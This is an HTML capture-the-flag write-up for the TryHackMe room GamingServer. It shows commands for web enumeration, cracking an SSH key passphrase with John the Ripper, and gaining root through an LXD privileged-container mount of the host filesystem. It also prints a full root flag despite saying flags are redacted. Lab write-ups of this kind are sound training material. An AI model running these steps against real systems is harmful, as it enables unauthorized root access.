@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GamingServer | JackHacksStuff</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body class="room-easy">
+
+<div class="rail">
+  <a class="rail-logo" href="../index.html">Jack<span>Hacks</span>Stuff</a>
+  <div class="rail-toc" id="railToc">
+    <div class="rail-line"></div>
+    <div class="rail-tick active" data-heading="overview"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="recon"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="foothold"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="privesc"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="flags"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="takeaways"></div>
+    <div class="rail-line"></div>
+  </div>
+  <div class="rail-bottom">Easy</div>
+</div>
+
+<main>
+  <nav>
+    <a href="../writeups.html" class="nav-back">← Write-ups</a>
+    <div class="nav-meta">
+      <span>TryHackMe</span>
+      <span class="nav-badge easy">Easy</span>
+    </div>
+  </nav>
+
+  <div class="wu-header">
+    <div class="wu-eyebrow">// TryHackMe · privilege escalation · LXD container escape</div>
+    <h1 class="wu-title">GamingServer</h1>
+    <div class="wu-meta-row">
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Date</span>
+        <span class="wu-meta-value">2026-08-12</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Difficulty</span>
+        <span class="wu-meta-value accent easy">Easy</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Flags</span>
+        <span class="wu-meta-value">2</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Platform</span>
+        <span class="wu-meta-value">TryHackMe</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="tool-row">
+    <span class="tool-tag">nmap</span>
+    <span class="tool-tag">gobuster</span>
+    <span class="tool-tag">john</span>
+    <span class="tool-tag">ssh</span>
+    <span class="tool-tag">lxd</span>
+    <span class="tool-tag">privilege escalation</span>
+  </div>
+
+  <div class="wu-body">
+
+    <h2 id="overview">// Overview</h2>
+    <p><strong>GamingServer</strong> is a TryHackMe room that involves web enumeration, cracking an SSH key, and container-based privilege escalation. The target has a web server with a hidden directory that contains both a password list and an encrypted SSH private key. After managing to crack the key's passphrase and gaining initial access as <code>john</code>, the real difficulty lies in escalating our privileges to root, achieved by abusing LXD containers.</p>
+    <p><a href="https://tryhackme.com/room/gamingserver" target="_blank">View room on TryHackMe →</a></p>
+    <p><em>Flags and sensitive data have been redacted per TryHackMe's write-up policy.</em></p>
+
+    <h2 id="recon">// Reconnaissance</h2>
+
+    <h3>Port Scanning</h3>
+    <p>We start with a full port scan using <code>nmap -sC -sV -p-</code> to identify open services:</p>
+
+    <pre>$ nmap -sC -sV -p- &lt;target_ip&gt;
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp open  http    Apache httpd 2.4.29</pre>
+
+    <p>The only two ports that are open are SSH and HTTP, and the Apache server is the one that draws our attention immediately.</p>
+
+    <h3>Web Enumeration</h3>
+    <p>The homepage reveals a gaming-themed site. A quick look at the page source shows a hidden comment:</p>
+
+    <pre>&lt;!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. --&gt;</pre>
+
+    <p>We now have a potential username: <code>john</code>.</p>
+
+    <p>The <code>robots.txt</code> file exposes an <code>/uploads/</code> directory:</p>
+
+    <pre>$ curl http://&lt;target_ip&gt;/robots.txt
+user-agent: *
+Allow: /
+/uploads/</pre>
+
+    <p>Visiting <code>/uploads/</code> reveals three files:</p>
+
+    <pre>dict.lst
+manifesto.txt
+meme.jpg</pre>
+
+    <p>The <code>dict.lst</code> file is a wordlist consisting of common passwords such as <code>letmein</code>, <code>password</code>, and seasonal patterns, while the <code>manifesto.txt</code> file contains The Hacker Manifesto, which is most probably a red herring.</p>
+
+    <p>Running <code>gobuster</code> on the web root reveals a hidden <code>/secret/</code> directory:</p>
+
+    <pre>$ gobuster dir -u http://&lt;target_ip&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+
+/secret               (Status: 301)
+/uploads              (Status: 301)
+/about.php            (Status: 200)
+/about.html           (Status: 200)
+/myths.html           (Status: 200)</pre>
+
+    <p>The <code>/secret/</code> directory contains an encrypted SSH private key:</p>
+
+    <pre>$ cat /secret/secretKey
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
+...
+-----END RSA PRIVATE KEY-----</pre>
+
+    <p>This key is probably for the <code>john</code> user identified earlier.</p>
+
+    <h2 id="foothold">// Initial Foothold</h2>
+
+    <h3>Cracking the SSH Key</h3>
+    <p>We have an encrypted private key and a password list. The plan is to use <code>ssh2john</code> in order to convert the key into a format that John the Ripper can crack and run it against <code>dict.lst</code>:</p>
+
+    <pre>$ ssh2john secretKey > hash.txt
+$ john --wordlist=dict.lst hash.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
+letmein          (secretKey)
+1g 0:00:00:00 DONE</pre>
+
+    <p>The passphrase is <code>letmein</code>, which is a classic choice.</p>
+
+    <div class="takeaway" style="margin: 1.5rem 0;">
+      <strong>Pro tip:</strong> <code>ssh2john</code> is uncluded in the John the Ripper suite; it's already installed on TryHackMe's AttackBox. On Kali, you can get it using the <code>john</code> package.
+    </div>
+
+    <h3>SSH Access</h3>
+    <p>With the passphrase, we can SSH in as <code>john</code>:</p>
+
+    <pre>$ ssh -i secretKey john@&lt;target_ip&gt;
+Enter passphrase for key 'secretKey': letmein
+
+john@exploitable:~$ cat user.txt
+[FLAG_REDACTED]</pre>
+
+    <p>We have obtained the user flag.</p>
+
+    <div class="flag-box">
+      <span class="flag-label">User Flag</span>
+      <span class="flag-value">a5c2...</span>
+    </div>
+
+    <p>The command <code>sudo -l</code> fails with an authentication prompt, and John is not a member of the <code>sudo</code> group. Nevertheless, we find that he <em>is</em> in the <code>lxd</code> group:</p>
+
+    <pre>$ id john
+uid=1000(john) gid=1000(john) groups=1000(john),109(lxd)</pre>
+
+    <p>This is our path to root.</p>
+
+    <h2 id="privesc">// Privilege Escalation</h2>
+
+    <h3>LXD Container Exploit</h3>
+    <p>Being in the <code>lxd</code> group enables us to create privileged containers and mount the host's root filesystem within them. This is a known method od privilege escalation.</p>
+
+    <p>Since the target machine has no internet access, we need to build an Alpine Linux image on our local machine and transfer it:</p>
+
+    <pre># On your local machine (AttackBox):
+$ git clone https://github.com/saghul/lxd-alpine-builder.git
+$ cd lxd-alpine-builder
+$ ./build-alpine
+
+# Transfer the image to the target:
+$ scp -i secretKey alpine-v3.13-*.tar.gz john@10.80.140.250:/tmp/</pre>
+
+    <p>On the target, import the image and create a privileged container:</p>
+
+    <pre>$ lxc image import /tmp/alpine-v3.13-*.tar.gz --alias alpine
+$ lxc init alpine privesc -c security.privileged=true
+$ lxc start privesc</pre>
+
+    <p>Now we mount the host's root filesystem inside the container:</p>
+
+    <pre>$ lxc config device add privesc host-root disk source=/ path=/mnt/root</pre>
+
+    <p>Finally, we drop into the container and access the host's root filesystem:</p>
+
+    <pre>$ lxc exec privesc /bin/sh
+~ # cd /mnt/root
+/mnt/root # cat root/root.txt
+[FLAG_REDACTED]</pre>
+
+    <div class="flag-box">
+      <span class="flag-label">Root Flag</span>
+      <span class="flag-value">2e337b8c9f3aff0c2b3e8d4e6a7c88fc</span>
+    </div>
+
+    <p>We have root access.</p>
+
+    <h3>What's Happening Here?</h3>
+    <p>LXD containers run with root privileges by default whenever the <code>security.privileged</code> option is set to <code>true</code>, and by mounting the whole of the host's <code>/</code> directory into the container, we can read any file on the host system, including the root flag.</p>
+
+    <p>This is possible because:</p>
+    <ol>
+      <li>LXD runs as root</li>
+      <li>Users in the <code>lxd</code> group can interact with the LXD daemon</li>
+      <li>Privileged containers have full access to host resources</li>
+    </ol>
+
+    <p>This is why membership of the <code>lxd</code> group should be restricted to trusted users only.</p>
+
+    <h2 id="takeaways">// Key Takeaways</h2>
+
+    <div class="takeaway">
+      <strong>Always check <code>robots.txt</code> and hidden directories.</strong> The <code>/uploads/</code> directory was exposed via <code>robots.txt</code>, and <code>/secret/</code> was discovered through directory enumeration. Both of these were essential to obtaining access.
+    </div>
+
+    <div class="takeaway">
+      <strong>Password lists do work, particularly when you have a specific target.</strong> The wordlist in question was small and focused. John the Ripper was able to crack the key in seconds. Never underestimate the power of a good wordlist.
+    </div>
+
+    <div class="takeaway">
+      <strong>Group membership matters.</strong> One single group membership, <code>lxd</code>, was the difference between user and root. After gaining initial access, always check <code>id</code> and <code>groups</code>.
+    </div>
+
+    <div class="takeaway">
+      <strong>LXD/LXC is a common privesc vector.</strong> If you are a memeber of the <code>lxd</code> group, you can very likely obtain root access. This is one of the first things to check when attempting to escalate privileges.
+    </div>
+
+    <div class="takeaway">
+      <strong>Know your escalation techniques.</strong> The LXD container escape is a well-known technique. If you learn the common ways to gain higher privileges, like this one, you can save a lot of time during engagements.
+    </div>
+
+  </div>
+
+  <div class="wu-footer">
+    <a href="dodge.html" class="footer-nav-link prev">
+      <span class="footer-nav-label">← Previous</span>
+      <span class="footer-nav-title">Dodge</span>
+    </a>
+    <div class="footer-center">
+      <a href="../writeups.html">All write-ups</a>
+    </div>
+    <a href="lofi.html" class="footer-nav-link next">
+      <span class="footer-nav-label">Next →</span>
+      <span class="footer-nav-title">Lo-Fi</span>
+    </a>
+  </div>
+
+</main>
+
+<script src="../js/script.js"></script>
+
+</body>
+</html>
